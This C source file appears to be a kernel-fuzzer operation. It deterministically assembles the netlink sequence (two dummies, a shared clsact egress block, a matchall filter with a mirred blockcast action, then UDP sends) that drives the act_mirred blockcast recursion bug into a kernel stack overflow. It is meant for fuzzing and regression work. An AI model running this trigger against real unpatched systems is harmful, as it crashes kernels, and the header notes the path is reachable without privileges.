/*
 * tc_mirred_blockcast - act_mirred blockcast egress-recursion driver.
 *
 * Exists to drive the recursion path the act_mirred blockcast fix
 * (CVE-class: kernel-side commit a005fa5d "net/sched: act_mirred:
 * Fix blockcast recursion bypass leading to stack overflow") closes.
 * The bug: tcf_mirred_act() reads m->tcfm_blockid and, when non-zero,
 * returns through tcf_blockcast() BEFORE the sched_mirred_nest++ that
 * gates MIRRED_NEST_LIMIT.  Two devices sharing a TC egress block with
 * a mirred blockcast rule bounce a single skb A->B->A->... until the
 * kernel stack guard page faults.  Reachable from unprivileged code
 * via unshare(CLONE_NEWUSER | CLONE_NEWNET) — user-namespace
 * CAP_NET_ADMIN is enough to wire up dummies + clsact + shared block +
 * mirred blockcast filter.
 *
 * Per-syscall fuzzing never assembles this shape: the random picker
 * cannot keep TCA_INGRESS_BLOCK / TCA_EGRESS_BLOCK consistent across
 * the two RTM_NEWQDISC messages it would need, can't keep
 * TCA_MIRRED_BLOCKID equal to the same block index, and can't keep
 * the matchall-on-shared-block tcm_ifindex == TCM_IFINDEX_MAGIC_BLOCK
 * trick in sync with the qdisc installs.  A deterministic per-op
 * builder assembles the whole stack each iteration.
 *
 * Sequence (per invocation):
 *   1. unshare(CLONE_NEWNET) once per child into a private net
 *      namespace so no host clsact / shared block is touched.
 *      Failure latches the whole op off.
 *   2. Open NETLINK_ROUTE socket with SO_RCVTIMEO=1s once.
 *      Best-effort modprobe sch_ingress / cls_matchall / act_mirred
 *      once.  Each modprobe attempt is latched so a missing
 *      /sbin/modprobe / lockdown=integrity pays the EFAIL once.
 *   3. Bring lo up inside the netns (one-time).
 *   4. RTM_NEWLINK type=dummy x2 — devices A and B, random suffixes
 *      per iteration so the qdisc tree is isolated from any other
 *      iteration's leftovers.  Failure latches ns_unsupported_dummy.
 *   5. RTM_SETLINK IFF_UP on both dummies.
 *   6. RTM_NEWQDISC clsact root on A with TCA_EGRESS_BLOCK=<idx>.
 *      RTM_NEWQDISC clsact root on B with TCA_EGRESS_BLOCK=<idx>
 *      (same idx).  The shared block index is picked once per
 *      iteration in [0x10, 0xff00] — block 0 / 1 are kernel-reserved.
 *      A reject with EOPNOTSUPP / EAFNOSUPPORT / ENOENT latches
 *      ns_unsupported_clsact and the op short-circuits next call.
 *   7. RTM_NEWTFILTER on the shared block via the magic-block
 *      ifindex (tcm_ifindex = TCM_IFINDEX_MAGIC_BLOCK, tcm_parent
 *      aliased as tcm_block_index = <idx>).  Kind=matchall,
 *      TCA_OPTIONS holds TCA_MATCHALL_ACT containing one nested
 *      action: TCA_ACT_KIND=mirred with TCA_ACT_OPTIONS carrying
 *      TCA_MIRRED_PARMS{ .eaction = TCA_EGRESS_REDIR (or MIRROR),
 *      .action = TC_ACT_STOLEN, .ifindex = B-index } and
 *      TCA_MIRRED_BLOCKID=<idx>.  The blockid is the key field —
 *      it routes the action through tcf_blockcast() in the kernel,
 *      which is the path that skips the nest++.
 *   8. socket(AF_INET, SOCK_DGRAM); bind to A via SO_BINDTODEVICE;
 *      sendto a small payload to a fixed loopback port BUDGETED+
 *      JITTER times.  Each send drives A's egress through
 *      sch_handle_egress -> tcf_classify -> matchall -> tcf_mirred_act
 *      -> tcf_blockcast -> (each device in block) tcf_mirred_to_dev
 *      -> dev_queue_xmit -> B's sch_handle_egress -> tcf_classify ->
 *      matchall (same filter, shared block) -> tcf_mirred_act ->
 *      tcf_blockcast -> back to A.  Unpatched kernels recurse until
 *      the task stack guard page faults; patched kernels cut the
 *      loop at MIRRED_NEST_LIMIT=4 and the burst returns normally.
 *   9. RTM_DELLINK both dummies.  netns destroy on child exit
 *      catches any leak.
 *
 * Self-bounding: one full create/drive/destroy cycle per invocation,
 * packet burst BUDGETED+JITTER around base 3 with STORM_BUDGET_NS
 * 200 ms wall-clock cap and a 12-frame ceiling on the inner send
 * loop.  All netlink and socket I/O is MSG_DONTWAIT; SO_RCVTIMEO=1s
 * on the rtnl ack socket so an unresponsive kernel can't wedge us
 * past the SIGALRM(1s) cap inherited from child.c.  Per-iteration
 * cleanup releases both dummies; private netns catches any leak.
 *
 * Subsystems reached: net/sched/sch_api.c (qdisc install with
 * TCA_EGRESS_BLOCK), net/sched/cls_api.c (shared-block filter install
 * via TCM_IFINDEX_MAGIC_BLOCK), net/sched/cls_matchall.c
 * (matchall_change with nested act), net/sched/act_api.c
 * (tcf_action_init / tcf_action_exec), net/sched/act_mirred.c
 * (tcf_mirred_act / tcf_blockcast / tcf_mirred_to_dev),
 * net/core/dev.c (__dev_queue_xmit / sch_handle_egress),
 * drivers/net/dummy.c.  CONFIG_NET_SCHED + NET_CLS_ACT=y +
 * NET_ACT_MIRRED=m + NET_SCH_INGRESS=m + NET_CLS_MATCHALL=m.
 */

#if __has_include(<linux/pkt_sched.h>)
#include <linux/pkt_sched.h>
#endif
#if __has_include(<linux/pkt_cls.h>)
#include <linux/pkt_cls.h>
#endif
#if __has_include(<linux/tc_act/tc_mirred.h>)
#include <linux/tc_act/tc_mirred.h>
#endif

#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>

#include "child.h"
#include "childops-netlink.h"
#include "childops-util.h"
#include "jitter.h"
#include "random.h"
#include "shm.h"
#include "trinity.h"

/*
 * UAPI fallbacks.  Stripped sysroots may not have the full
 * pkt_sched.h / pkt_cls.h / tc_mirred.h; the IDs / values are kernel
 * UAPI and stable.  __has_include() above keeps compilation working;
 * these fill in the names we use.
 */
#ifndef TC_H_ROOT
#define TC_H_ROOT		(0xFFFFFFFFU)
#endif
#ifndef TC_H_CLSACT
#define TC_H_CLSACT		(0xFFFFFFF1U)
#endif
#ifndef TC_H_MAJ_MASK
#define TC_H_MAJ_MASK		(0xFFFF0000U)
#endif
#ifndef TC_H_MIN_MASK
#define TC_H_MIN_MASK		(0x0000FFFFU)
#endif

#ifndef TCA_INGRESS_BLOCK
#define TCA_INGRESS_BLOCK	13
#endif
#ifndef TCA_EGRESS_BLOCK
#define TCA_EGRESS_BLOCK	14
#endif

#ifndef TCA_UNSPEC
#define TCA_UNSPEC		0
#define TCA_KIND		1
#define TCA_OPTIONS		2
#endif

#ifndef RTM_NEWQDISC
#define RTM_NEWQDISC		36
#define RTM_NEWTFILTER		44
#endif

#ifndef ETH_P_ALL
#define ETH_P_ALL		0x0003
#endif

#ifndef TCM_IFINDEX_MAGIC_BLOCK
#define TCM_IFINDEX_MAGIC_BLOCK	(0xFFFFFFFFU)
#endif

/* tc_act/tc_mirred.h eaction values */
#ifndef TCA_EGRESS_REDIR
#define TCA_EGRESS_REDIR	1
#define TCA_EGRESS_MIRROR	2
#endif

/* tca_id action attribute IDs */
#ifndef TCA_ACT_UNSPEC
#define TCA_ACT_UNSPEC		0
#define TCA_ACT_KIND		1
#define TCA_ACT_OPTIONS		2
#endif

/* TCA_MIRRED_* attribute IDs (kernel UAPI; stable). */
#ifndef TCA_MIRRED_UNSPEC
#define TCA_MIRRED_UNSPEC	0
#define TCA_MIRRED_TM		1
#define TCA_MIRRED_PARMS	2
#define TCA_MIRRED_PAD		3
#define TCA_MIRRED_BLOCKID	4
#endif

/* TCA_MATCHALL_* attribute IDs */
#ifndef TCA_MATCHALL_UNSPEC
#define TCA_MATCHALL_UNSPEC	0
#define TCA_MATCHALL_CLASSID	1
#define TCA_MATCHALL_ACT	2
#define TCA_MATCHALL_FLAGS	3
#endif

#ifndef TC_ACT_PIPE
#define TC_ACT_PIPE		3
#define TC_ACT_STOLEN		4
#endif

/*
 * struct tc_mirred fallback.  Layout from include/uapi/linux/
 * tc_act/tc_mirred.h: tc_gen prefix (u32 index, u32 capab, int
 * action, int refcnt, int bindcnt) + int eaction + u32 ifindex.
 * Defined unconditionally as fallback_tc_mirred so the local
 * builder is portable across distros whose tc_mirred.h pulls in
 * incompatible types.  Sized exactly like the kernel struct via
 * explicit field types.
 */
struct fallback_tc_mirred {
	__u32	index;
	__u32	capab;
	int	action;
	int	refcnt;
	int	bindcnt;
	int	eaction;
	__u32	ifindex;
};

#define RTNL_BUF_BYTES		2048

/*
 * Per-iteration burst.  BUDGETED+JITTER scales it.  The bug is
 * single-packet: ONE skb that round-trips through A->B->A is enough
 * to recurse past MIRRED_NEST_LIMIT and walk the stack down.  Keep
 * the burst small so a patched kernel doesn't churn the schedulers
 * for nothing.  STORM_BUDGET_NS clamps wall-clock even if every send
 * is fast.
 */
#define MIRRED_PACKET_BASE	3U
#define MIRRED_PACKET_FLOOR	4U
#define MIRRED_PACKET_CAP	12U
#define STORM_BUDGET_NS		200000000L

#define MIRRED_INNER_PORT	34571

/* Per-child latched gates.  Set on the first failure of the
 * corresponding subsystem and never cleared. */
static bool ns_unshared;
static bool ns_setup_failed;
static bool ns_unsupported_rtnl;
static bool ns_unsupported_dummy;
static bool ns_unsupported_clsact;
static bool ns_unsupported_mirred;
static bool ns_unsupported_matchall;
static bool ns_unsupported_inet;
static bool lo_brought_up;
static bool modprobe_tried_ingress;
static bool modprobe_tried_matchall;
static bool modprobe_tried_mirred;

static int build_dummy_create(struct nl_ctx *ctx, const char *name)
{
	unsigned char buf[RTNL_BUF_BYTES];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifi;
	size_t off, li_off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
			   NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	ifi = (struct ifinfomsg *)NLMSG_DATA(nlh);
	ifi->ifi_family = AF_UNSPEC;
	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*ifi));

	off = nla_put_str(buf, off, sizeof(buf), IFLA_IFNAME, name);
	if (!off)
		return -EIO;

	li_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), IFLA_LINKINFO);
	if (!off)
		return -EIO;
	off = nla_put_str(buf, off, sizeof(buf), IFLA_INFO_KIND, "dummy");
	if (!off)
		return -EIO;
	nla_nest_end(buf, li_off, off);

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv_retry(ctx, buf, off);
}

/*
 * RTM_NEWQDISC clsact root on (ifindex) with TCA_EGRESS_BLOCK=block.
 * TCA_INGRESS_BLOCK is left unset — the bug runs entirely on the
 * egress path and pinning ingress too would unnecessarily double the
 * block-share surface.  clsact takes no TCA_OPTIONS (the kernel
 * silently ignores them).
 */
static int build_clsact_with_egress_block(struct nl_ctx *ctx, int ifindex,
					  __u32 block_idx)
{
	unsigned char buf[RTNL_BUF_BYTES];
	struct nlmsghdr *nlh;
	struct tcmsg *tcm;
	size_t off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWQDISC;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
			   NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	tcm = (struct tcmsg *)NLMSG_DATA(nlh);
	tcm->tcm_family  = AF_UNSPEC;
	tcm->tcm_ifindex = ifindex;
	tcm->tcm_handle  = TC_H_MAJ_MASK;	/* major:0 == clsact handle */
	tcm->tcm_parent  = TC_H_CLSACT;
	tcm->tcm_info    = 0;

	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*tcm));

	off = nla_put_str(buf, off, sizeof(buf), TCA_KIND, "clsact");
	if (!off)
		return -EIO;

	off = nla_put_u32(buf, off, sizeof(buf), TCA_EGRESS_BLOCK, block_idx);
	if (!off)
		return -EIO;

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv_retry(ctx, buf, off);
}

/*
 * RTM_NEWTFILTER on the shared block (tcm_ifindex =
 * TCM_IFINDEX_MAGIC_BLOCK, tcm_parent aliased = block_idx).  Filter
 * kind=matchall, single mirred action with TCA_MIRRED_BLOCKID set ==
 * block_idx so the action routes through tcf_blockcast() in the
 * kernel — the path that skips the recursion-counter increment.
 *
 * eaction toggles between EGRESS_REDIR and EGRESS_MIRROR per call so
 * the verdict-handling diff between the two branches gets coverage
 * over time; both branches end up in tcf_blockcast() with non-zero
 * blockid, which is the path the bug lives in.  tc_mirred.parms.ifindex
 * is left at 0: the kernel rejects -EINVAL when both blockid and
 * ifindex are non-zero, so setting an ifindex here would make the
 * filter install fail before the blockcast path ever runs.  With
 * ifindex=0 and TCA_MIRRED_BLOCKID set, the action takes the
 * tcf_blockcast() route.
 */
static int build_mirred_blockcast_filter(struct nl_ctx *ctx, __u32 block_idx,
					 int eaction)
{
	unsigned char buf[RTNL_BUF_BYTES];
	struct nlmsghdr *nlh;
	struct tcmsg *tcm;
	struct fallback_tc_mirred parms;
	size_t off, opts_off, act_off, act1_off, act_opts_off;
	__u32 prio_proto;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWTFILTER;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
			   NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	tcm = (struct tcmsg *)NLMSG_DATA(nlh);
	tcm->tcm_family  = AF_UNSPEC;
	tcm->tcm_ifindex = (int)TCM_IFINDEX_MAGIC_BLOCK;
	tcm->tcm_handle  = 0;
	tcm->tcm_parent  = block_idx;	/* aliased as tcm_block_index */
	prio_proto = ((__u32)1U << 16) | (__u32)htons(ETH_P_ALL);
	tcm->tcm_info    = prio_proto;

	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*tcm));

	off = nla_put_str(buf, off, sizeof(buf), TCA_KIND, "matchall");
	if (!off)
		return -EIO;

	opts_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), TCA_OPTIONS);
	if (!off)
		return -EIO;

	/*
	 * TCA_MATCHALL_ACT wraps one or more per-action nests.  Each
	 * per-action nest is keyed by 1-based action index; we only
	 * install one mirred action so index == 1.
	 */
	act_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), TCA_MATCHALL_ACT);
	if (!off)
		return -EIO;

	act1_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), 1);
	if (!off)
		return -EIO;

	off = nla_put_str(buf, off, sizeof(buf), TCA_ACT_KIND, "mirred");
	if (!off)
		return -EIO;

	act_opts_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), TCA_ACT_OPTIONS);
	if (!off)
		return -EIO;

	memset(&parms, 0, sizeof(parms));
	parms.action  = TC_ACT_STOLEN;
	parms.eaction = eaction;
	parms.ifindex = 0;
	off = nla_put(buf, off, sizeof(buf), TCA_MIRRED_PARMS,
		      &parms, sizeof(parms));
	if (!off)
		return -EIO;

	off = nla_put_u32(buf, off, sizeof(buf), TCA_MIRRED_BLOCKID, block_idx);
	if (!off)
		return -EIO;

	nla_nest_end(buf, act_opts_off, off);
	nla_nest_end(buf, act1_off, off);
	nla_nest_end(buf, act_off, off);
	nla_nest_end(buf, opts_off, off);

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv_retry(ctx, buf, off);
}

static bool is_unsupported_err(int rc)
{
	return rc == -EOPNOTSUPP || rc == -EAFNOSUPPORT ||
	       rc == -EPROTONOSUPPORT || rc == -ENOENT;
}

/*
 * Per-child one-time setup: unshare a fresh netns, open rtnl,
 * modprobe the modules clsact / matchall / act_mirred need, bring lo
 * up.  Latched failures shut the whole op off via the ns_* gates
 * checked in the orchestrator on subsequent invocations.  Returns 0
 * on success; nonzero means the caller should bail without entering
 * the cleanup path.
 */
static int tc_mirred_setup_netns(struct nl_ctx *ctx)
{
	struct nl_open_opts nl_opts = {
		.proto = NETLINK_ROUTE,
		.recv_timeo_s = 1,
	};

	if (!ns_unshared) {
		if (unshare(CLONE_NEWNET) < 0) {
			ns_setup_failed = true;
			__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_setup_failed,
					   1, __ATOMIC_RELAXED);
			return -1;
		}
		ns_unshared = true;
	}

	if (nl_open(ctx, &nl_opts) < 0) {
		if (errno == EPROTONOSUPPORT || errno == EAFNOSUPPORT)
			ns_unsupported_rtnl = true;
		__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_setup_failed,
				   1, __ATOMIC_RELAXED);
		return -1;
	}

	if (!modprobe_tried_ingress) {
		modprobe_tried_ingress = true;
		try_modprobe("sch_ingress");
	}
	if (!modprobe_tried_matchall) {
		modprobe_tried_matchall = true;
		try_modprobe("cls_matchall");
	}
	if (!modprobe_tried_mirred) {
		modprobe_tried_mirred = true;
		try_modprobe("act_mirred");
	}

	if (!lo_brought_up) {
		rtnl_bring_lo_up(ctx);
		lo_brought_up = true;
	}
	return 0;
}

bool tc_mirred_blockcast(struct childdata *child)
{
	struct nl_ctx nl = { .fd = -1 };
	char a_name[IFNAMSIZ];
	char b_name[IFNAMSIZ];
	int a_idx = 0, b_idx = 0;
	bool a_added = false, b_added = false;
	__u32 block_idx;
	int udp = -1;
	int rc;
	int eaction;

	(void)child;

	__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_runs, 1,
			   __ATOMIC_RELAXED);

	if (ns_setup_failed || ns_unsupported_rtnl || ns_unsupported_dummy ||
	    ns_unsupported_clsact || ns_unsupported_matchall ||
	    ns_unsupported_mirred)
		return true;

	if (tc_mirred_setup_netns(&nl) != 0)
		return true;

	/* Random suffix per iteration so concurrent children (and our
	 * own cleanup races) don't collide on names. */
	snprintf(a_name, sizeof(a_name), "trmra%u",
		 (unsigned int)(rand32() & 0xffffu));
	snprintf(b_name, sizeof(b_name), "trmrb%u",
		 (unsigned int)(rand32() & 0xffffu));

	rc = build_dummy_create(&nl, a_name);
	if (rc != 0) {
		if (is_unsupported_err(rc))
			ns_unsupported_dummy = true;
		goto out;
	}
	a_added = true;
	a_idx = (int)if_nametoindex(a_name);
	if (a_idx <= 0)
		goto out;

	rc = build_dummy_create(&nl, b_name);
	if (rc != 0) {
		if (is_unsupported_err(rc))
			ns_unsupported_dummy = true;
		goto out;
	}
	b_added = true;
	b_idx = (int)if_nametoindex(b_name);
	if (b_idx <= 0)
		goto out;

	(void)rtnl_setlink_up(&nl, a_idx);
	(void)rtnl_setlink_up(&nl, b_idx);

	/* Block index range: avoid 0 (invalid) and 1 (kernel-reserved
	 * shared-block seed in some configs).  Upper bound keeps us
	 * clear of TCM_IFINDEX_MAGIC_BLOCK's neighbourhood and any
	 * future kernel-reserved range. */
	block_idx = (__u32)((rand32() % 0xfef0U) + 0x10U);

	rc = build_clsact_with_egress_block(&nl, a_idx, block_idx);
	if (rc != 0) {
		if (is_unsupported_err(rc))
			ns_unsupported_clsact = true;
		__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_qdisc_fail,
				   1, __ATOMIC_RELAXED);
		goto out;
	}
	__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_qdisc_ok,
			   1, __ATOMIC_RELAXED);

	rc = build_clsact_with_egress_block(&nl, b_idx, block_idx);
	if (rc != 0) {
		if (is_unsupported_err(rc))
			ns_unsupported_clsact = true;
		__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_qdisc_fail,
				   1, __ATOMIC_RELAXED);
		goto out;
	}
	__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_qdisc_ok,
			   1, __ATOMIC_RELAXED);

	eaction = ONE_IN(2) ? TCA_EGRESS_REDIR : TCA_EGRESS_MIRROR;

	rc = build_mirred_blockcast_filter(&nl, block_idx, eaction);
	if (rc != 0) {
		if (is_unsupported_err(rc)) {
			ns_unsupported_matchall = true;
			ns_unsupported_mirred = true;
		}
		__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_filter_fail,
				   1, __ATOMIC_RELAXED);
		goto out;
	}
	__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_filter_ok,
			   1, __ATOMIC_RELAXED);

	if (!ns_unsupported_inet) {
		struct sockaddr_in dst;
		struct timespec t0;
		unsigned int iters, i;

		udp = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
		if (udp < 0) {
			if (errno == EAFNOSUPPORT || errno == EPROTONOSUPPORT)
				ns_unsupported_inet = true;
			goto out;
		}

		(void)setsockopt(udp, SOL_SOCKET, SO_BINDTODEVICE,
				 a_name, strlen(a_name) + 1);

		memset(&dst, 0, sizeof(dst));
		dst.sin_family      = AF_INET;
		dst.sin_port        = htons(MIRRED_INNER_PORT);
		dst.sin_addr.s_addr = htonl(0x7f000001U);	/* 127.0.0.1 */

		(void)clock_gettime(CLOCK_MONOTONIC, &t0);
		iters = BUDGETED(CHILD_OP_TC_MIRRED_BLOCKCAST,
				 JITTER_RANGE(MIRRED_PACKET_BASE));
		if (iters < MIRRED_PACKET_FLOOR)
			iters = MIRRED_PACKET_FLOOR;
		if (iters > MIRRED_PACKET_CAP)
			iters = MIRRED_PACKET_CAP;

		for (i = 0; i < iters; i++) {
			unsigned char payload[64];
			ssize_t n;

			if (ns_since(&t0) >= STORM_BUDGET_NS)
				break;

			generate_rand_bytes(payload, sizeof(payload));
			n = sendto(udp, payload, sizeof(payload),
				   MSG_DONTWAIT,
				   (struct sockaddr *)&dst, sizeof(dst));
			if (n > 0)
				__atomic_add_fetch(&shm->stats.tc_mirred_blockcast_packet_sent_ok,
						   1, __ATOMIC_RELAXED);
		}
	}

out:
	if (udp >= 0)
		close(udp);

	if (nl.fd >= 0) {
		if (a_added && a_idx > 0)
			(void)rtnl_dellink(&nl, a_idx);
		if (b_added && b_idx > 0)
			(void)rtnl_dellink(&nl, b_idx);
		nl_close(&nl);
	}

	return true;
}
